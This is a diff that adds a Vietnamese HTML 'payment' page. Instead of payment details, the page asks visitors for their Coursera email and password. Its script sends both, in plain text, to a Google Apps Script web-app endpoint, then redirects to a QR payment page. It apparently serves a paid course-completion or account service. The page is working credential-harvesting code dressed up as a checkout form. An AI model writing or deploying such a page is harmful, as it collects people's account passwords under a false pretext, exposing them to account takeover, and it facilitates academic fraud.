@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Thanh Toán - Lữ Chí Vỹ</title>
+    <style>
+        body { background: linear-gradient(135deg, #6b46c1, #9f7aea); font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; color: white; }
+        .pay-container { background: rgba(255, 255, 255, 0.1); padding: 40px; border-radius: 20px; backdrop-filter: blur(10px); width: 100%; max-width: 450px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+        h2 { text-transform: uppercase; letter-spacing: 2px; margin-bottom: 30px; }
+        .input-group { text-align: left; margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-size: 14px; }
+        input { width: 100%; padding: 12px; border-radius: 8px; border: none; outline: none; font-size: 16px; box-sizing: border-box; }
+        .btn-submit { width: 100%; padding: 15px; background: #2563eb; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; }
+        .btn-submit:disabled { background: #9ca3af; cursor: not-allowed; }
+        .footer-note { font-size: 12px; margin-top: 20px; opacity: 0.8; }
+    </style>
+</head>
+<body>
+    <div class="pay-container">
+        <h2>Thanh Toán</h2>
+        <div class="input-group">
+            <label>Email Coursera:</label>
+            <input type="email" id="email" placeholder="your.email@example.com" required>
+        </div>
+        <div class="input-group">
+            <label>Password Coursera:</label>
+            <input type="password" id="password" placeholder="Nhập mật khẩu..." required>
+        </div>
+        <button class="btn-submit" id="submitBtn" onclick="handlePayment()">THANH TOÁN NGAY</button>
+        <p class="footer-note">Sau khi chuyển khoản, nếu có lỗi xảy ra vui lòng liên hệ Facebook tác giả.</p>
+    </div>
+
+    <script>
+        async function handlePayment() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const submitBtn = document.getElementById('submitBtn');
+
+            const urlParams = new URLSearchParams(window.location.search);
+            const amount = urlParams.get('price') || '65000';
+
+            if (!email || !password) {
+                alert("Vui lòng nhập đủ thông tin!");
+                return;
+            }
+
+            submitBtn.disabled = true;
+            submitBtn.innerText = "ĐANG XỬ LÝ...";
+
+            // LINK WEB APP CỦA BẠN ĐÃ ĐƯỢC DÁN TẠI ĐÂY
+            const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyyRScHJsQYyDxeuW4TP5ph137gtcy2hwt_bxfi7re_X3cGoNubBjPMmQiXkcT6JFpy/exec";
+
+            try {
+                await fetch(SCRIPT_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({
+                        email: email,
+                        password: password,
+                        package: amount == '100000' ? "Khóa SWE202c" : "Thuê Gói VIP",
+                        amount: amount + " VND"
+                    })
+                });
+                window.location.href = `qr.html?amount=${amount}`;
+            } catch (error) {
+                window.location.href = `qr.html?amount=${amount}`;
+            }
+        }
+    </script>
+</body>
+</html>
